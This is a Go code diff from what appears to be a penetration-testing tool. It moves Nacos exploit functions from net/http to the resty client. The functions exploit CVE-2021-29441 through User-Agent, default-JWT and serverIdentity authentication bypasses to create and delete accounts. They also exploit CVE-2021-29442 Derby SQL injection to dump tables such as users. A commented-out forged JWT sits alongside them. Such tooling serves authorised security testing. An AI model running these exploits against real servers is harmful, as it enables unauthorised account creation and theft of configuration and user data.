@@ -2,9 +2,10 @@ package nacos
 
 import (
 	"fmt"
-	"net/http"
 	"slack-wails/lib/clients"
 	"strings"
+
+	"github.com/go-resty/resty/v2"
 )
 
 // const token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g"
@@ -18,35 +19,35 @@ var sqi = []string{"select * from users", "select * from config_tags_relation", 
 // UA绕过 ser-Agent: Nacos-Server
 // JWT默认key绕过
 // serverIdentity头绕过 Nacos <= 2.2.0
-func CVE_2021_29441_Step1(url string, headers map[string]string, username, password string, client *http.Client) bool {
+func CVE_2021_29441_Step1(url string, headers map[string]string, username, password string, client *resty.Client) bool {
 	headers["Content-Type"] = "application/x-www-form-urlencoded"
 	content := fmt.Sprintf("username=%s&password=%s", username, password)
-	_, body, err := clients.NewRequest("POST", url+cve_2021_29411_userURI, headers, strings.NewReader(content), 10, false, client)
+	resp, err := clients.DoRequest("POST", url+cve_2021_29411_userURI, headers, strings.NewReader(content), 10, client)
 	if err != nil {
 		return false
 	}
-	return strings.Contains(string(body), "create user ok")
+	return strings.Contains(string(resp.Body()), "create user ok")
 }
 
 // 删除用户
-func CVE_2021_29441_Step2(url string, headers map[string]string, username string, client *http.Client) bool {
-	_, body, err := clients.NewRequest("DELETE", url+cve_2021_29411_userURI+"?username="+username, headers, nil, 10, false, client)
+func CVE_2021_29441_Step2(url string, headers map[string]string, username string, client *resty.Client) bool {
+	resp, err := clients.DoRequest("DELETE", url+cve_2021_29411_userURI+"?username="+username, headers, nil, 10, client)
 	if err != nil {
 		return false
 	}
-	return strings.Contains(string(body), "delete user ok")
+	return strings.Contains(string(resp.Body()), "delete user ok")
 }
 
 // CVE-2021-29442 Derby SQL注入
-func CVE_2021_29442(url string, headers map[string]string, client *http.Client) string {
+func CVE_2021_29442(url string, headers map[string]string, client *resty.Client) string {
 	var result string
 	for _, sql := range sqi {
-		_, body, err := clients.NewRequest("GET", url+cve_2021_29442_URI+sql, headers, nil, 10, false, client)
+		resp, err := clients.DoRequest("GET", url+cve_2021_29442_URI+sql, headers, nil, 10, client)
 		if err != nil {
 			return "请求失败已停止，返回之前SQL语句请求结果\n\n" + result
 		}
-		if strings.Contains(string(body), "\"code\":200") {
-			result += string(body) + "\n"
+		if strings.Contains(string(resp.Body()), "\"code\":200") {
+			result += string(resp.Body()) + "\n"
 		}
 	}
 	return result
